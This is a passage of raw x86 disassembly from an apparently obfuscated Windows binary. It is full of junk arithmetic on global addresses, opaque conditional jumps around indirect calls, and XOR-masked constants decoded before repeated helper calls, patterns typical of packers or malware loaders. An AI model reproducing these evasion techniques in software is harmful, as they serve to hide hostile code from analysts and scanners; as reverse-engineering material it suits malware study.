  42050b:	sub    DWORD PTR ds:0x4228d2,ecx
  420511:	and    DWORD PTR ds:0x4228ae,ebx
  420517:	adc    DWORD PTR ds:0x42299e,edi
  42051d:	adc    DWORD PTR ds:0x4229be,edi
  420523:	add    DWORD PTR ds:0x42294a,edi
  420529:	add    DWORD PTR ds:0x4228da,0x3429
  420533:	sub    DWORD PTR ds:0x42296e,ecx
  420539:	mov    eax,DWORD PTR [ebp-0x138]
  42053f:	imul   ecx,eax
  420542:	xor    DWORD PTR ds:0x4229aa,ebx
  420548:	mov    eax,DWORD PTR [ebp-0x13c]
  42054e:	xor    DWORD PTR ds:0x42298e,0x5901
  420558:	and    ecx,eax
  42055a:	mov    eax,0x3b18
  42055f:	and    DWORD PTR ds:0x4228b6,0x42293e
  420569:	sub    eax,ecx
  42056b:	or     DWORD PTR ds:0x4228ee,0x4ab5
  420575:	mov    DWORD PTR [ebp-0xfc],eax
  42057b:	mov    ecx,DWORD PTR ds:0x4228aa
  420581:	sbb    DWORD PTR ds:0x42288a,ecx
  420587:	mov    DWORD PTR [ebp-0x28],0x16d7
  42058e:	xor    eax,eax
  420590:	mov    DWORD PTR [ebp-0x134],0x6b4
  42059a:	xor    eax,eax
  42059c:	mov    eax,DWORD PTR [ebp-0x134]
  4205a2:	add    ecx,DWORD PTR ds:0x42289a
  4205a8:	or     eax,0x4f70
  4205ad:	mov    ecx,DWORD PTR [ebp-0x28]
  4205b0:	sub    DWORD PTR ds:0x4229ca,0x4228aa
  4205ba:	or     eax,ecx
  4205bc:	and    DWORD PTR ds:0x4228ba,ebx
  4205c2:	sub    eax,0x5ff7
  4205c7:	mov    ecx,DWORD PTR ds:0x422a82
  4205cd:	mov    ecx,DWORD PTR [ecx]
  4205cf:	adc    DWORD PTR ds:0x42294e,ecx
  4205d5:	mov    DWORD PTR [ebp-0xc8],eax
  4205db:	mov    DWORD PTR [ebp-0xe4],0x5f39
  4205e5:	mov    DWORD PTR [ebp-0xc4],0x6236
  4205ef:	not    eax
  4205f1:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  4205f8:	or     eax,DWORD PTR ds:0x42289a
  4205fe:	mov    DWORD PTR [ebp-0x128],0x7537
  420608:	mov    DWORD PTR [ebp-0x114],0x6985
  420612:	mov    DWORD PTR [ebp-0x14],0x5627
  420619:	mov    DWORD PTR [ebp-0x64],0x72e7
  420620:	not    DWORD PTR ds:0x42293a
  420626:	mov    eax,DWORD PTR [ebp-0x14]
  420629:	cmp    DWORD PTR ds:0x4228be,0x0
  420630:	mov    DWORD PTR ds:0x4228c2,edx
  420636:	mov    DWORD PTR ds:0x42299e,0x4cb1
  420640:	movzx  ecx,WORD PTR ds:0x4228a2
  420647:	jmp    0x4206f7
  42064c:	mov    DWORD PTR ds:0x4228e2,0x2b18
  420656:	jl     0x420687
  42065c:	push   DWORD PTR [ebp-0x28]
  42065f:	push   0x68d6
  420664:	push   0x1f9a
  420669:	push   0x3f36
  42066e:	push   DWORD PTR [ebp-0x14]
  420671:	call   DWORD PTR ds:0x42a1d0
  420677:	and    DWORD PTR ds:0x422972,edi
  42067d:	sub    DWORD PTR ds:0x4229a6,0x3838
  420687:	sub    DWORD PTR ds:0x422926,0x422946
  420691:	sub    DWORD PTR ds:0x42288e,edi
  420697:	inc    ecx
  420698:	cmp    DWORD PTR ds:0x4228da,0x0
  42069f:	mov    DWORD PTR ds:0x422916,edi
  4206a5:	mov    DWORD PTR ds:0x4228c2,0x3e4f
  4206af:	mov    ecx,0x124e
  4206b4:	jmp    0x4206f7
  4206b9:	movzx  ecx,WORD PTR ds:0x4228fa
  4206c0:	jg     0x4206e5
  4206c6:	push   0x110e
  4206cb:	call   DWORD PTR ds:0x42a1d4
  4206d1:	mov    ecx,DWORD PTR ds:0x42292e
  4206d7:	sub    DWORD PTR ds:0x4229ba,ecx
  4206dd:	not    ecx
  4206df:	sub    ecx,0x3ff2
  4206e5:	sbb    DWORD PTR ds:0x4229b2,ecx
  4206eb:	mov    ecx,DWORD PTR ds:0x4229ba
  4206f1:	or     DWORD PTR ds:0x422996,ecx
  4206f7:	add    eax,DWORD PTR [ebp-0x64]
  4206fa:	cmp    DWORD PTR ds:0x42296a,0x0
  420701:	mov    DWORD PTR ds:0x4229b6,edx
  420707:	mov    DWORD PTR ds:0x4228ce,0x892
  420711:	mov    DWORD PTR ds:0x42295a,0x70ff
  42071b:	mov    DWORD PTR ds:0x42292e,edi
  420721:	jmp    0x420786
  420726:	mov    DWORD PTR ds:0x4228ea,0x2b24
  420730:	jge    0x420764
  420736:	call   DWORD PTR ds:0x42a2ec
  42073c:	xor    DWORD PTR ds:0x4229ce,ebx
  420742:	mov    ecx,DWORD PTR ds:0x422902
  420748:	or     ecx,DWORD PTR ds:0x422976
  42074e:	mov    DWORD PTR ds:0x422902,ecx
  420754:	and    ecx,DWORD PTR ds:0x42293e
  42075a:	sub    DWORD PTR ds:0x4228fe,0x422922
  420764:	add    DWORD PTR ds:0x422952,ecx
  42076a:	and    ecx,DWORD PTR ds:0x4228c6
  420770:	adc    ecx,DWORD PTR ds:0x42290e
  420776:	sub    ecx,DWORD PTR ds:0x4228a2
  42077c:	and    DWORD PTR ds:0x42295e,0x60c
  420786:	mov    ecx,DWORD PTR [ebp-0x114]
  42078c:	sub    DWORD PTR ds:0x4229ba,0x175
  420796:	sub    eax,ecx
  420798:	mov    ecx,DWORD PTR [ebp-0x128]
  42079e:	and    DWORD PTR ds:0x42288e,0x7a1c
  4207a8:	imul   eax,ecx
  4207ab:	imul   eax,eax,0xe4e
  4207b1:	neg    ecx
  4207b3:	mov    ecx,DWORD PTR [ebp-0x7c]
  4207b6:	and    DWORD PTR ds:0x42288e,0x4228ea
  4207c0:	or     eax,ecx
  4207c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4207c5:	lea    eax,[ecx+eax*1+0x46210209]
  4207cc:	xor    DWORD PTR ds:0x42291a,0x563e
  4207d6:	push   eax
  4207d7:	sub    DWORD PTR ds:0x422926,0x42288e
  4207e1:	call   0x41d197
  4207e6:	neg    ecx
  4207e8:	mov    ecx,eax
  4207ea:	mov    eax,DWORD PTR [ebp-0xc4]
  4207f0:	sub    esi,0x184b
  4207f6:	imul   eax,eax,0x21b3
  4207fc:	and    esi,DWORD PTR ds:0x42297a
  420802:	add    eax,DWORD PTR [ebp-0xe4]
  420808:	and    eax,0xd5c
  42080d:	and    DWORD PTR ds:0x422952,0x302e
  420817:	sub    eax,0x2e81
  42081c:	or     esi,DWORD PTR ds:0x4228ea
  420822:	xor    edx,edx
  420824:	mov    esi,0x2f1dc
  420829:	or     DWORD PTR ds:0x422942,0x422976
  420833:	div    esi
  420835:	xor    eax,0x56ef
  42083a:	cmp    DWORD PTR ds:0x422946,0x0
  420841:	mov    DWORD PTR ds:0x422916,edi
  420847:	mov    DWORD PTR ds:0x422966,0x662c
  420851:	mov    DWORD PTR ds:0x4229d2,edi
  420857:	jmp    0x420977
  42085c:	mov    DWORD PTR ds:0x4229ce,0x4f06
  420866:	jg     0x420881
  42086c:	push   DWORD PTR [ebp-0x20]
  42086f:	call   DWORD PTR ds:0x42a1d8
  420875:	sub    esi,DWORD PTR ds:0x42288e
  42087b:	sub    DWORD PTR ds:0x4229ba,edx
  420881:	or     esi,esi
  420883:	add    edx,0x7894
  420889:	mov    esi,DWORD PTR ds:0x4229f6
  42088f:	mov    edx,DWORD PTR ds:0x422a52
  420895:	sub    edx,esi
  420897:	imul   esi,DWORD PTR [esi+edx*1]
  42089b:	xor    edx,DWORD PTR ds:0x422896
  4208a1:	cmp    DWORD PTR ds:0x42295e,0x0
  4208a8:	mov    DWORD PTR ds:0x4228ea,0x1c26
  4208b2:	mov    DWORD PTR ds:0x4229b2,edx
  4208b8:	jmp    0x420977
  4208bd:	mov    DWORD PTR ds:0x422962,0x1de8
  4208c7:	jb     0x4208f6
  4208cd:	push   DWORD PTR [ebp-0xc]
  4208d0:	push   0x797e
  4208d5:	push   DWORD PTR [ebp-0x28]
  4208d8:	push   DWORD PTR [ebp-0x20]
  4208db:	push   DWORD PTR [ebp-0x20]
  4208de:	call   DWORD PTR ds:0x42a0a0
  4208e4:	xor    edx,0x2ce5
  4208ea:	adc    DWORD PTR ds:0x422946,edi
  4208f0:	sub    DWORD PTR ds:0x4229ca,edx
  4208f6:	xor    edx,esi
  4208f8:	and    esi,edx
  4208fa:	mov    edx,DWORD PTR ds:0x4229e2
  420900:	mov    esi,DWORD PTR ds:0x422ab2
  420906:	sub    edx,esi
  420908:	xor    edx,DWORD PTR [edx+esi*1]
  42090b:	cmp    DWORD PTR ds:0x42298a,0x0
  420912:	mov    DWORD PTR ds:0x4228d6,edx
  420918:	movzx  edx,WORD PTR ds:0x422896
  42091f:	mov    edx,0x6c32
  420924:	jmp    0x420977
  420929:	mov    DWORD PTR ds:0x422896,0x27d5
  420933:	mov    DWORD PTR ds:0x4228a2,0x76ec
  42093d:	jb     0x420965
  420943:	push   DWORD PTR [ebp-0x28]
  420946:	push   DWORD PTR [ebp-0x28]
  420949:	call   DWORD PTR ds:0x42a0a4
  42094f:	adc    edx,0x3a8d
  420955:	and    DWORD PTR ds:0x422976,0x6cff
  42095f:	or     DWORD PTR ds:0x422992,ebx
  420965:	xor    edx,DWORD PTR ds:0x42299a
  42096b:	inc    DWORD PTR ds:0x4229ba
  420971:	and    DWORD PTR ds:0x422932,edx
  420977:	add    ecx,eax
  420979:	mov    DWORD PTR [ebp-0x90],ecx
  42097f:	mov    DWORD PTR [ebp-0xe0],0x7a31
  420989:	inc    esi
  42098a:	mov    DWORD PTR [ebp-0x44],0x2514
  420991:	xor    eax,eax
  420993:	or     eax,DWORD PTR ds:0x4228ee
  420999:	xor    DWORD PTR ds:0x422932,eax
  42099f:	mov    DWORD PTR [ebp-0xdc],0x699c
  4209a9:	sbb    edx,ecx
  4209ab:	mov    DWORD PTR [ebp-0xd8],0x1
  4209b5:	mov    DWORD PTR [ebp-0x24],0x7901
  4209bc:	cmp    DWORD PTR ds:0x422976,0x0
  4209c3:	not    edx
  4209c5:	mov    DWORD PTR ds:0x4228a2,0x569b
  4209cf:	mov    DWORD PTR ds:0x4228a6,0x4d6f
  4209d9:	mov    DWORD PTR ds:0x42297e,edx
  4209df:	jmp    0x420a2e
  4209e4:	mov    DWORD PTR ds:0x422976,edx
  4209ea:	mov    DWORD PTR ds:0x4228fa,ecx
  4209f0:	je     0x420a12
  4209f6:	push   0x5aed
  4209fb:	push   0x6c8d
  420a00:	call   DWORD PTR ds:0x42a2f0
  420a06:	xor    DWORD PTR ds:0x42293a,0x1a42
  420a10:	adc    esi,ecx
  420a12:	adc    edx,DWORD PTR ds:0x4228d6
  420a18:	and    ecx,0x55be
  420a1e:	sbb    DWORD PTR ds:0x42290a,0x346b
  420a28:	add    ecx,0x18f
  420a2e:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  420a38:	mov    eax,ds:0x422ab6
  420a3d:	mov    eax,DWORD PTR [eax]
  420a3f:	sub    DWORD PTR ds:0x4228ce,eax
  420a45:	mov    DWORD PTR [ebp-0x78],0x37f2
  420a4c:	or     DWORD PTR ds:0x4229b2,edx
  420a52:	mov    DWORD PTR [ebp-0x10],0x62ba
  420a59:	mov    DWORD PTR [ebp-0x94],0x561c
  420a63:	adc    DWORD PTR ds:0x4228e6,0x1c9a
  420a6d:	mov    DWORD PTR [ebp-0x34],0x58bc
  420a74:	xor    DWORD PTR ds:0x4228a2,edi
  420a7a:	mov    DWORD PTR [ebp-0x60],0x24c7
  420a81:	mov    DWORD PTR [ebp-0x5c],0x7a45
  420a88:	or     esi,ecx
  420a8a:	mov    eax,DWORD PTR [ebp-0x34]
  420a8d:	adc    esi,DWORD PTR ds:0x422936
  420a93:	mov    ecx,DWORD PTR [ebp-0x60]
  420a96:	mov    edx,DWORD PTR ds:0x4228ea
  420a9c:	add    DWORD PTR ds:0x42292e,edx
  420aa2:	mov    edx,DWORD PTR [ebp-0x5c]
  420aa5:	xor    DWORD PTR ds:0x4228b2,ecx
  420aab:	and    edx,0x160e
  420ab1:	neg    esi
  420ab3:	sub    edx,ecx
  420ab5:	sub    edx,0x29ad
  420abb:	or     esi,ecx
  420abd:	imul   edx,eax
  420ac0:	cmp    DWORD PTR ds:0x42292e,0x0
  420ac7:	mov    ecx,DWORD PTR ds:0x4229c6
  420acd:	mov    DWORD PTR ds:0x4229c6,0x2cb4
  420ad7:	mov    esi,0x7aa2
  420adc:	jmp    0x420b1c
  420ae1:	mov    DWORD PTR ds:0x4228e2,edx
  420ae7:	mov    eax,ds:0x422996
  420aec:	jb     0x420b14
  420af2:	push   DWORD PTR [ebp-0x10]
  420af5:	call   DWORD PTR ds:0x42a1dc
  420afb:	sbb    DWORD PTR ds:0x422986,edx
  420b01:	xor    esi,esi
  420b03:	add    esi,DWORD PTR ds:0x4229e6
  420b09:	mov    ecx,DWORD PTR ds:0x422a76
  420b0f:	sub    ecx,esi
  420b11:	xor    esi,DWORD PTR [esi+ecx*1]
  420b14:	and    ecx,esi
  420b16:	dec    DWORD PTR ds:0x42289a
  420b1c:	mov    eax,DWORD PTR [ebp-0x90]
  420b22:	lea    eax,[eax+edx*1+0x14f2e240]
  420b29:	sub    ecx,DWORD PTR ds:0x42296e
  420b2f:	mov    DWORD PTR [ebp-0x174],eax
  420b35:	mov    eax,DWORD PTR [ebp-0x24]
  420b38:	and    DWORD PTR ds:0x422896,0x422952
  420b42:	mov    ecx,DWORD PTR [ebp-0x94]
  420b48:	mov    edx,DWORD PTR [ebp-0x10]
  420b4b:	xor    edx,ecx
  420b4d:	cmp    DWORD PTR ds:0x4228be,0x0
  420b54:	not    esi
  420b56:	mov    DWORD PTR ds:0x422946,0x4c6a
  420b60:	jmp    0x420bc0
  420b65:	mov    DWORD PTR ds:0x42293e,0x2e5b
  420b6f:	not    DWORD PTR ds:0x4229ae
  420b75:	jae    0x420bb0
  420b7b:	push   DWORD PTR [ebp-0xc]
  420b7e:	push   0x4ad9
  420b83:	push   0x541c
  420b88:	push   0x4226c9
  420b8d:	push   0x8f89
  420b92:	call   DWORD PTR ds:0x42a2f4
  420b98:	sbb    esi,0x7b5f
  420b9e:	or     DWORD PTR ds:0x4228f6,0x55a2
  420ba8:	sbb    DWORD PTR ds:0x4228ee,ebx
  420bae:	neg    ecx
  420bb0:	xor    ecx,ecx
  420bb2:	add    esi,esi
  420bb4:	sub    esi,esi
  420bb6:	or     DWORD PTR ds:0x42298e,0x3de5
  420bc0:	add    edx,DWORD PTR [ebp-0x78]
  420bc3:	adc    ecx,DWORD PTR ds:0x4228de
  420bc9:	mov    ecx,DWORD PTR [ebp-0xc0]
  420bcf:	lea    ecx,[edx+ecx*1+0x6ac1]
  420bd6:	and    ecx,eax
  420bd8:	mov    eax,0x1101
  420bdd:	cmp    DWORD PTR ds:0x42294e,0x0
  420be4:	mov    DWORD PTR ds:0x4228fe,0x36ab
  420bee:	mov    esi,DWORD PTR ds:0x4228b6
  420bf4:	mov    edx,0x20e8
  420bf9:	jmp    0x420c4b
  420bfe:	mov    esi,DWORD PTR ds:0x42299a
  420c04:	ja     0x420c38
  420c0a:	push   0x4228a2
  420c0f:	push   0x42299a
  420c14:	push   0x42293a
  420c19:	call   DWORD PTR ds:0x42a0a8
  420c1f:	adc    edx,0x5974
  420c25:	movzx  esi,BYTE PTR ds:0x422952
  420c2c:	xor    DWORD PTR ds:0x4228ce,esi
  420c32:	or     DWORD PTR ds:0x422926,ecx
  420c38:	or     edx,DWORD PTR ds:0x4228ce
  420c3e:	movzx  edx,WORD PTR ds:0x4229b6
  420c45:	sub    DWORD PTR ds:0x42299e,edx
  420c4b:	sub    eax,ecx
  420c4d:	add    eax,DWORD PTR [ebp+0x8]
  420c50:	mov    DWORD PTR [ebp-0x170],eax
  420c56:	cmp    DWORD PTR ds:0x422952,0x0
  420c5d:	mov    DWORD PTR ds:0x42289a,0x4ae9
  420c67:	mov    DWORD PTR ds:0x422896,0x6df4
  420c71:	mov    DWORD PTR ds:0x422902,0x1097
  420c7b:	mov    esi,0x562b
  420c80:	jmp    0x420cda
  420c85:	not    eax
  420c87:	mov    DWORD PTR ds:0x422896,ebx
  420c8d:	jae    0x420cca
  420c93:	push   0x61a8
  420c98:	push   0x28f0
  420c9d:	push   0x2a61
  420ca2:	push   0x1d7f
  420ca7:	push   DWORD PTR [ebp-0xc]
  420caa:	push   DWORD PTR [ebp-0x24]
  420cad:	push   0x73d0
  420cb2:	call   DWORD PTR ds:0x42a1e0
  420cb8:	adc    edx,0x4a39
  420cbe:	xor    edx,esi
  420cc0:	or     DWORD PTR ds:0x422946,0x6558
  420cca:	sub    esi,0x4c5d
  420cd0:	xor    DWORD PTR ds:0x4228d2,0x124
  420cda:	mov    DWORD PTR [ebp-0x15c],0xba699573
  420ce4:	mov    DWORD PTR [ebp-0x158],0x9c0a89d8
  420cee:	mov    DWORD PTR [ebp-0x154],0xba699577
  420cf8:	sbb    DWORD PTR ds:0x422956,edi
  420cfe:	mov    DWORD PTR [ebp-0x150],0x9c0a89d8
  420d08:	or     esi,0x7211
  420d0e:	mov    esi,DWORD PTR [ebp-0x174]
  420d14:	mov    eax,DWORD PTR [ebp-0x154]
  420d1a:	mov    edx,DWORD PTR [ebp-0x150]
  420d20:	sbb    DWORD PTR ds:0x42292e,0x5043
  420d2a:	xor    eax,0xba699573
  420d2f:	sub    DWORD PTR ds:0x4228fa,0x6217
  420d39:	xor    edx,0x9c0a89d8
  420d3f:	mov    cl,0x2
  420d41:	call   0x41a184
  420d46:	cmp    DWORD PTR ds:0x4229aa,0x0
  420d4d:	mov    DWORD PTR ds:0x422936,0x7dfa
  420d57:	mov    ebx,DWORD PTR ds:0x422896
  420d5d:	not    ebx
  420d5f:	mov    ebx,0x627c
  420d64:	jmp    0x420db8
  420d69:	mov    DWORD PTR ds:0x422892,0x500b
  420d73:	mov    DWORD PTR ds:0x4229a6,0x12a3
  420d7d:	jle    0x420da9
  420d83:	push   DWORD PTR [ebp-0xc]
  420d86:	push   0x7ce6
  420d8b:	push   DWORD PTR [ebp-0x28]
  420d8e:	call   DWORD PTR ds:0x42a2f8
  420d94:	add    ebx,0x3114
  420d9a:	movzx  ebx,BYTE PTR ds:0x4229ae
  420da1:	add    DWORD PTR ds:0x422922,ebx
  420da7:	and    ebx,ebx
  420da9:	inc    ebx
  420daa:	neg    ebx
  420dac:	xor    edi,DWORD PTR ds:0x422962
  420db2:	xor    ebx,DWORD PTR ds:0x4228ba
  420db8:	mov    edi,eax
  420dba:	mov    ebx,edx
  420dbc:	and    edx,DWORD PTR ds:0x422902
  420dc2:	mov    eax,DWORD PTR [ebp-0x154]
  420dc8:	mov    edx,DWORD PTR [ebp-0x150]
  420dce:	xor    eax,0xba699573
  420dd3:	xor    edx,0x9c0a89d8
  420dd9:	mov    cl,0x3e
  420ddb:	adc    DWORD PTR ds:0x4228ea,0x4228ee
  420de5:	call   0x421cb2
  420dea:	or     edi,eax
  420dec:	or     ebx,edx
  420dee:	cmp    DWORD PTR ds:0x422912,0x0
  420df5:	mov    DWORD PTR ds:0x422992,ecx
  420dfb:	mov    DWORD PTR ds:0x4228d2,edi
  420e01:	not    edx
  420e03:	mov    edx,0x3bde
  420e08:	jmp    0x420e59
  420e0d:	not    eax
  420e0f:	mov    eax,ds:0x422922
  420e14:	jne    0x420e47
  420e1a:	push   0x10a6
  420e1f:	call   DWORD PTR ds:0x42a0ac
  420e25:	xor    DWORD PTR ds:0x4228ea,0x6213
  420e2f:	mov    edx,DWORD PTR ds:0x422ad6
  420e35:	mov    edx,DWORD PTR [edx]
  420e37:	sub    DWORD PTR ds:0x4228ea,edx
  420e3d:	adc    DWORD PTR ds:0x42297e,0x796e
  420e47:	sub    DWORD PTR ds:0x42291e,ebx
  420e4d:	sbb    edx,0x242b
  420e53:	sbb    edx,DWORD PTR ds:0x42291a
  420e59:	mov    eax,DWORD PTR [ebp-0x15c]
  420e5f:	neg    edx
  420e61:	mov    edx,DWORD PTR [ebp-0x158]
  420e67:	sub    DWORD PTR ds:0x4228b6,0x5dbf
  420e71:	xor    eax,0xba699573
  420e76:	sbb    DWORD PTR ds:0x422942,0x2b75
  420e80:	xor    edx,0x9c0a89d8
  420e86:	mov    cl,0x2
  420e88:	adc    DWORD PTR ds:0x422966,0x1945
  420e92:	call   0x41a184
  420e97:	mov    ecx,edx
  420e99:	mov    edx,DWORD PTR [ebp-0x15c]
  420e9f:	mov    DWORD PTR [ebp-0x218],esi
  420ea5:	mov    esi,DWORD PTR [ebp-0x158]
  420eab:	xor    edx,0xba699573
  420eb1:	xor    esi,0x9c0a89d8
  420eb7:	mov    DWORD PTR [ebp-0x21c],eax
  420ebd:	mov    eax,edx
  420ebf:	mov    edx,esi
  420ec1:	mov    DWORD PTR [ebp-0x220],ecx
  420ec7:	mov    cl,0x3e
  420ec9:	call   0x421cb2
  420ece:	mov    esi,DWORD PTR [ebp-0x21c]
  420ed4:	or     esi,eax
  420ed6:	mov    eax,DWORD PTR [ebp-0x220]
  420edc:	or     eax,edx
  420ede:	push   eax
  420edf:	push   esi
  420ee0:	push   ebx
  420ee1:	push   edi
  420ee2:	call   0x41e026
  420ee7:	mov    esi,DWORD PTR [ebp-0x218]
  420eed:	cmp    esi,eax
  420eef:	jne    0x420fa5
  420ef5:	mov    eax,DWORD PTR [ebp-0x154]
  420efb:	mov    edx,DWORD PTR [ebp-0x150]
  420f01:	xor    eax,0xba699573
  420f06:	xor    edx,0x9c0a89d8
  420f0c:	mov    cl,0x2
  420f0e:	call   0x41a184
  420f13:	mov    esi,eax
  420f15:	mov    edi,edx
  420f17:	mov    eax,DWORD PTR [ebp-0x154]
  420f1d:	mov    edx,DWORD PTR [ebp-0x150]
  420f23:	xor    eax,0xba699573
  420f28:	xor    edx,0x9c0a89d8
  420f2e:	mov    cl,0x3e
  420f30:	call   0x421cb2
  420f35:	or     esi,eax
  420f37:	or     edi,edx
  420f39:	mov    eax,DWORD PTR [ebp-0x15c]
  420f3f:	mov    edx,DWORD PTR [ebp-0x158]
  420f45:	xor    eax,0xba699573
  420f4a:	xor    edx,0x9c0a89d8
  420f50:	mov    cl,0x2
  420f52:	call   0x41a184
  420f57:	mov    ebx,eax
  420f59:	mov    eax,edx
  420f5b:	mov    ecx,DWORD PTR [ebp-0x15c]
  420f61:	mov    edx,DWORD PTR [ebp-0x158]
  420f67:	xor    ecx,0xba699573
  420f6d:	xor    edx,0x9c0a89d8
  420f73:	mov    DWORD PTR [ebp-0x224],eax
  420f79:	mov    eax,ecx
  420f7b:	mov    cl,0x3e
  420f7d:	call   0x421cb2
  420f82:	or     ebx,eax
  420f84:	mov    eax,DWORD PTR [ebp-0x224]
  420f8a:	or     eax,edx
  420f8c:	push   eax
  420f8d:	push   ebx
  420f8e:	push   edi
  420f8f:	push   esi
  420f90:	call   0x41e026
  420f95:	mov    DWORD PTR [ebp-0x178],eax
  420f9b:	jmp    0x421265
  420fa0:	jmp    0x42121b
  420fa5:	lea    eax,[ebp-0x168]
  420fab:	mov    DWORD PTR [ebp-0x164],eax
  420fb1:	mov    eax,DWORD PTR [ebp-0x164]
  420fb7:	mov    DWORD PTR [eax],0xa3e69a9d
  420fbd:	mov    eax,DWORD PTR [ebp-0x168]
  420fc3:	xor    eax,0xa3e69a9d
  420fc8:	shr    eax,0x2
  420fcb:	mov    ecx,DWORD PTR [ebp-0x168]
  420fd1:	xor    ecx,0xa3e69a9d
  420fd7:	shl    ecx,0x1e
  420fda:	or     eax,ecx
  420fdc:	mov    ecx,DWORD PTR [ebp-0x174]
  420fe2:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  420fe6:	mov    DWORD PTR [ebp-0x160],eax
  420fec:	mov    esi,DWORD PTR [ebp-0x160]
  420ff2:	mov    eax,DWORD PTR [ebp-0x154]
  420ff8:	mov    edx,DWORD PTR [ebp-0x150]
  420ffe:	xor    eax,0xba699573
  421003:	xor    edx,0x9c0a89d8
  421009:	mov    cl,0x2
  42100b:	call   0x41a184
  421010:	mov    edi,eax
  421012:	mov    ebx,edx
  421014:	mov    eax,DWORD PTR [ebp-0x154]
  42101a:	mov    edx,DWORD PTR [ebp-0x150]
  421020:	xor    eax,0xba699573
  421025:	xor    edx,0x9c0a89d8
  42102b:	mov    cl,0x3e
  42102d:	call   0x421cb2
  421032:	or     edi,eax
  421034:	or     ebx,edx
  421036:	mov    eax,DWORD PTR [ebp-0x15c]
  42103c:	mov    edx,DWORD PTR [ebp-0x158]
  421042:	xor    eax,0xba699573
  421047:	xor    edx,0x9c0a89d8
  42104d:	mov    cl,0x2
  42104f:	call   0x41a184
  421054:	mov    ecx,edx
  421056:	mov    edx,DWORD PTR [ebp-0x15c]
  42105c:	mov    DWORD PTR [ebp-0x228],esi
  421062:	mov    esi,DWORD PTR [ebp-0x158]
  421068:	xor    edx,0xba699573
  42106e:	xor    esi,0x9c0a89d8
  421074:	mov    DWORD PTR [ebp-0x22c],eax
  42107a:	mov    eax,edx
  42107c:	mov    edx,esi
  42107e:	mov    DWORD PTR [ebp-0x230],ecx
  421084:	mov    cl,0x3e
  421086:	call   0x421cb2
  42108b:	mov    esi,DWORD PTR [ebp-0x22c]
  421091:	or     esi,eax
  421093:	mov    eax,DWORD PTR [ebp-0x230]
  421099:	or     eax,edx
  42109b:	push   eax
  42109c:	push   esi
  42109d:	push   ebx
  42109e:	push   edi
  42109f:	call   0x41e026
  4210a4:	mov    esi,DWORD PTR [ebp-0x228]
  4210aa:	cmp    esi,eax
  4210ac:	je     0x421121
  4210b2:	mov    eax,DWORD PTR [ebp-0x154]
  4210b8:	mov    edx,DWORD PTR [ebp-0x150]
  4210be:	xor    eax,0xba699573
  4210c3:	xor    edx,0x9c0a89d8
  4210c9:	mov    cl,0x2
  4210cb:	call   0x41a184
  4210d0:	mov    esi,eax
  4210d2:	mov    edi,edx
  4210d4:	mov    eax,DWORD PTR [ebp-0x154]
  4210da:	mov    edx,DWORD PTR [ebp-0x150]
  4210e0:	xor    eax,0xba699573
  4210e5:	xor    edx,0x9c0a89d8
  4210eb:	mov    cl,0x3e
  4210ed:	call   0x421cb2
  4210f2:	or     esi,eax
  4210f4:	or     edi,edx
  4210f6:	mov    eax,DWORD PTR [ebp-0x160]
  4210fc:	imul   esi,eax
  4210ff:	add    esi,DWORD PTR [ebp-0x170]
  421105:	mov    DWORD PTR [ebp-0x16c],esi
  42110b:	mov    eax,DWORD PTR [ebp-0x16c]
  421111:	mov    DWORD PTR [ebp-0x178],eax
  421117:	jmp    0x421265
  42111c:	jmp    0x4211cc
  421121:	mov    eax,DWORD PTR [ebp-0x154]
  421127:	mov    edx,DWORD PTR [ebp-0x150]
  42112d:	xor    eax,0xba699573
  421132:	xor    edx,0x9c0a89d8
  421138:	mov    cl,0x2
  42113a:	call   0x41a184
  42113f:	mov    esi,eax
  421141:	mov    edi,edx
  421143:	mov    eax,DWORD PTR [ebp-0x154]
  421149:	mov    edx,DWORD PTR [ebp-0x150]
  42114f:	xor    eax,0xba699573
  421154:	xor    edx,0x9c0a89d8
  42115a:	mov    cl,0x3e
  42115c:	call   0x421cb2
  421161:	or     esi,eax
  421163:	or     edi,edx
  421165:	mov    eax,DWORD PTR [ebp-0x15c]
  42116b:	mov    edx,DWORD PTR [ebp-0x158]
  421171:	xor    eax,0xba699573
  421176:	xor    edx,0x9c0a89d8
  42117c:	mov    cl,0x2
  42117e:	call   0x41a184
  421183:	mov    ebx,eax
  421185:	mov    eax,edx
  421187:	mov    ecx,DWORD PTR [ebp-0x15c]
  42118d:	mov    edx,DWORD PTR [ebp-0x158]
  421193:	xor    ecx,0xba699573
  421199:	xor    edx,0x9c0a89d8
  42119f:	mov    DWORD PTR [ebp-0x234],eax
  4211a5:	mov    eax,ecx
  4211a7:	mov    cl,0x3e
  4211a9:	call   0x421cb2
  4211ae:	or     ebx,eax
  4211b0:	mov    eax,DWORD PTR [ebp-0x234]
  4211b6:	or     eax,edx
  4211b8:	push   eax
  4211b9:	push   ebx
  4211ba:	push   edi
  4211bb:	push   esi
  4211bc:	call   0x41e026
  4211c1:	mov    DWORD PTR [ebp-0x178],eax
  4211c7:	jmp    0x421265
  4211cc:	mov    eax,DWORD PTR [ebp-0x15c]
  4211d2:	mov    edx,DWORD PTR [ebp-0x158]
  4211d8:	xor    eax,0xba699573
  4211dd:	xor    edx,0x9c0a89d8
  4211e3:	mov    cl,0x2
  4211e5:	call   0x41a184
  4211ea:	mov    esi,eax
  4211ec:	mov    edi,edx
  4211ee:	mov    eax,DWORD PTR [ebp-0x15c]
  4211f4:	mov    edx,DWORD PTR [ebp-0x158]
  4211fa:	xor    eax,0xba699573
  4211ff:	xor    edx,0x9c0a89d8
  421205:	mov    cl,0x3e
  421207:	call   0x421cb2
  42120c:	or     esi,eax
  42120e:	or     edi,edx
  421210:	mov    DWORD PTR [ebp-0x178],esi
  421216:	jmp    0x421265
  42121b:	mov    eax,DWORD PTR [ebp-0x15c]
  421221:	mov    edx,DWORD PTR [ebp-0x158]
  421227:	xor    eax,0xba699573
  42122c:	xor    edx,0x9c0a89d8
  421232:	mov    cl,0x2
  421234:	call   0x41a184
  421239:	mov    esi,eax
  42123b:	mov    edi,edx
  42123d:	mov    eax,DWORD PTR [ebp-0x15c]
  421243:	mov    edx,DWORD PTR [ebp-0x158]
  421249:	xor    eax,0xba699573
  42124e:	xor    edx,0x9c0a89d8
  421254:	mov    cl,0x3e
  421256:	call   0x421cb2
  42125b:	or     esi,eax
  42125d:	or     edi,edx
  42125f:	mov    DWORD PTR [ebp-0x178],esi
  421265:	mov    ecx,DWORD PTR [ebp-0xd8]
  42126b:	mov    eax,0x459a
  421270:	xor    edx,edx
  421272:	div    ecx
